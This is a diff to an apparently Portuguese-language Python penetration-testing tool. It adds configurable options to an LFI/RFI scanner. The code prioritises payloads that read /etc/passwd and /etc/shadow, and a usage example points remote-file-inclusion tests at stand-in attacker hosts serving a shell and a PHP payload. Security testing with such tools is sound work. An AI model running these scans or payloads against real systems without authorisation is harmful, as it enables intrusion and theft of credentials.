@@ -8080,7 +8080,7 @@ def command_injection_scan(url):
 # --- MÓDULO 17: SCANNER DE LFI (LOCAL FILE INCLUSION) ---
 
 class LFIScanner:
-    def __init__(self, base_url, timeout=10, threads=5, custom_payloads=None, payload_file=None):
+    def __init__(self, base_url, timeout=10, threads=5, custom_payloads=None, payload_file=None, max_payloads=None, traversal_depth=10, encoding_techniques=13, custom_rfi=None, session_pool_size=None):
         self.base_url = base_url
         self.timeout = timeout
         self.threads = threads
@@ -8090,10 +8090,16 @@ class LFIScanner:
         self.stop_on_first = False
         self.custom_payloads = custom_payloads
         self.payload_file = payload_file
+        self.max_payloads = max_payloads
+        self.traversal_depth = traversal_depth
+        self.encoding_techniques = encoding_techniques
+        self.custom_rfi = custom_rfi
+        self.session_pool_size = session_pool_size
         
         # Session pool para melhor performance
         self.session_pool = []
-        for _ in range(min(threads, 10)):  # Máximo 10 sessões
+        pool_size = session_pool_size if session_pool_size else min(threads, 10)
+        for _ in range(pool_size):  # Tamanho configurável
             session = requests.Session()
             session.headers.update({
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
@@ -8218,6 +8224,12 @@ class LFIScanner:
         
         # Processar payloads customizados
         self._load_custom_payloads()
+        
+        # Processar RFI customizadas
+        self._load_custom_rfi()
+        
+        # Aplicar limite de payloads se especificado
+        self._apply_payload_limit()
 
     def _load_custom_payloads(self):
         """Carrega payloads customizados do CLI ou arquivo"""
@@ -8265,6 +8277,38 @@ class LFIScanner:
             if self.verbose:
                 console.print(f"[*] Total de {len(custom_payload_list)} payloads customizados adicionados")
                 console.print(f"[*] Total geral de payloads: {len(self.payloads)}")
+
+    def _load_custom_rfi(self):
+        """Carrega URLs RFI customizadas"""
+        if self.custom_rfi:
+            custom_rfi_list = [url.strip() for url in self.custom_rfi.split(',')]
+            self.rfi_payloads = custom_rfi_list
+            if self.verbose:
+                console.print(f"[*] Carregadas {len(custom_rfi_list)} URLs RFI customizadas")
+                console.print(f"[*] URLs RFI: {', '.join(custom_rfi_list[:3])}{'...' if len(custom_rfi_list) > 3 else ''}")
+
+    def _apply_payload_limit(self):
+        """Aplica limite máximo de payloads se especificado"""
+        if self.max_payloads and len(self.payloads) > self.max_payloads:
+            # Manter os payloads mais importantes (arquivos críticos primeiro)
+            critical_files = ['/etc/passwd', '/etc/shadow', '/windows/system32/drivers/etc/hosts', '/proc/version']
+            
+            # Separar payloads críticos dos demais
+            critical_payloads = {k: v for k, v in self.payloads.items() if any(cf in k for cf in critical_files)}
+            other_payloads = {k: v for k, v in self.payloads.items() if k not in critical_payloads}
+            
+            # Construir lista limitada priorizando críticos
+            limited_payloads = critical_payloads.copy()
+            remaining_slots = self.max_payloads - len(critical_payloads)
+            
+            if remaining_slots > 0:
+                other_items = list(other_payloads.items())[:remaining_slots]
+                limited_payloads.update(dict(other_items))
+            
+            self.payloads = limited_payloads
+            if self.verbose:
+                console.print(f"[*] Payloads limitados a {len(self.payloads)} (máximo: {self.max_payloads})")
+                console.print(f"[*] Priorizados {len(critical_payloads)} payloads críticos")
 
     def _get_session(self):
         """Obtém uma sessão do pool de forma round-robin"""
@@ -8361,6 +8405,10 @@ class LFIScanner:
             if tech not in seen:
                 seen.add(tech)
                 unique_techniques.append(tech)
+        
+        # Limitar número de técnicas se especificado
+        if self.encoding_techniques and len(unique_techniques) > self.encoding_techniques:
+            unique_techniques = unique_techniques[:self.encoding_techniques]
         
         return unique_techniques
 
@@ -8648,7 +8696,7 @@ class LFIScanner:
             else:
                 console.print(f"[*] Modo: [blue]COMPLETO[/blue] - Todas as técnicas disponíveis")
                 console.print(f"[*] Técnicas de bypass: {len(self._apply_encoding_techniques('test'))} variações por payload")
-                console.print(f"[*] Níveis de path traversal: 10 (completo)")
+                console.print(f"[*] Níveis de path traversal: {self.traversal_depth} (configurável)")
             
             if self.stop_on_first:
                 console.print(f"[*] Estratégia: [green]STOP-ON-FIRST[/green] - Para na primeira vulnerabilidade crítica/alta")
@@ -8658,6 +8706,14 @@ class LFIScanner:
                 console.print(f"[*] RFI payloads: {len(self.rfi_payloads)} URLs de teste")
                 console.print(f"[*] Pool de sessões: {len(self.session_pool)} sessões HTTP reutilizáveis")
                 console.print(f"[*] Execução: [cyan]PARALELA[/cyan] com ThreadPoolExecutor")
+                
+                # Mostrar configurações customizadas
+                if self.max_payloads:
+                    console.print(f"[*] Limite de payloads: {self.max_payloads} (customizado)")
+                if self.custom_payloads or self.payload_file:
+                    console.print(f"[*] Payloads customizados: [green]ATIVO[/green]")
+                if self.custom_rfi:
+                    console.print(f"[*] URLs RFI customizadas: [green]ATIVO[/green]")
                 
             console.print("-" * 80)
         
@@ -9082,9 +9138,20 @@ class LFIScanner:
         except Exception as e:
             console.print(f"[red]Erro ao exportar resultados: {e}[/red]")
 
-def lfi_scan(url, timeout=10, threads=5, export_results=False, verbose=False, fast_mode=False, stop_on_first=False, custom_payloads=None, payload_file=None):
+def lfi_scan(url, timeout=10, threads=5, export_results=False, verbose=False, fast_mode=False, stop_on_first=False, custom_payloads=None, payload_file=None, max_payloads=None, traversal_depth=10, encoding_techniques=13, custom_rfi=None, session_pool_size=None):
     """Função principal para executar scan de LFI/RFI otimizado"""
-    scanner = LFIScanner(url, timeout=timeout, threads=threads, custom_payloads=custom_payloads, payload_file=payload_file)
+    scanner = LFIScanner(
+        url, 
+        timeout=timeout, 
+        threads=threads, 
+        custom_payloads=custom_payloads, 
+        payload_file=payload_file,
+        max_payloads=max_payloads,
+        traversal_depth=traversal_depth,
+        encoding_techniques=encoding_techniques,
+        custom_rfi=custom_rfi,
+        session_pool_size=session_pool_size
+    )
     scanner.verbose = verbose
     scanner.fast_mode = fast_mode
     scanner.stop_on_first = stop_on_first
@@ -10535,6 +10602,12 @@ Exemplos de Uso:
   
   # Scanner LFI combinando payloads customizados com modo rápido
   python %(prog)s lfi-scan -u "http://dvwa.local/vulnerabilities/fi/" --custom-payloads "/proc/version,/etc/issue" --fast --threads 10
+  
+  # Scanner LFI com parâmetros avançados customizados
+  python %(prog)s lfi-scan -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --max-payloads 20 --traversal-depth 15 --encoding-techniques 20 --verbose
+  
+  # Scanner LFI com URLs RFI customizadas e pool de sessões otimizado
+  python %(prog)s lfi-scan -u "https://demo.testfire.net/bank/queryxpath.aspx" --custom-rfi "http://evil.com/shell.txt,https://attacker.com/payload.php" --session-pool-size 15
 
   # Procura por CVEs para OpenSSL, ignorando o cache e filtrando por CVSS
   python %(prog)s cve-scan --product openssl --version 1.0.2 --min-cvss 7.0 --no-cache
@@ -10666,6 +10739,11 @@ Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
     parser_lfi.add_argument('--stop-on-first', action='store_true', help='Para após encontrar primeira vulnerabilidade de alto risco')
     parser_lfi.add_argument('--custom-payloads', type=str, help='Payloads customizados separados por vírgula (ex: "../../etc/passwd,../../../windows/system32/drivers/etc/hosts")')
     parser_lfi.add_argument('--payload-file', type=str, help='Arquivo contendo payloads customizados (um por linha)')
+    parser_lfi.add_argument('--max-payloads', type=int, help='Limita número máximo de payloads a testar (padrão: todos)')
+    parser_lfi.add_argument('--traversal-depth', type=int, default=10, help='Profundidade máxima de path traversal (padrão: 10)')
+    parser_lfi.add_argument('--encoding-techniques', type=int, default=13, help='Número de técnicas de encoding por payload (padrão: 13)')
+    parser_lfi.add_argument('--custom-rfi', type=str, help='URLs RFI customizadas separadas por vírgula')
+    parser_lfi.add_argument('--session-pool-size', type=int, help='Tamanho do pool de sessões HTTP (padrão: baseado em threads)')
 
     parser_ssrf = subparsers.add_parser('ssrf-scan', help='[Scan] Procura por falhas de Server-Side Request Forgery (SSRF).')
     parser_ssrf.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
@@ -10872,7 +10950,12 @@ Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
             fast_mode=args.fast,
             stop_on_first=args.stop_on_first,
             custom_payloads=args.custom_payloads,
-            payload_file=args.payload_file
+            payload_file=args.payload_file,
+            max_payloads=args.max_payloads,
+            traversal_depth=args.traversal_depth,
+            encoding_techniques=args.encoding_techniques,
+            custom_rfi=args.custom_rfi,
+            session_pool_size=args.session_pool_size
         )
     elif args.tool == 'ssrf-scan':
         ssrf_scan(args.url)
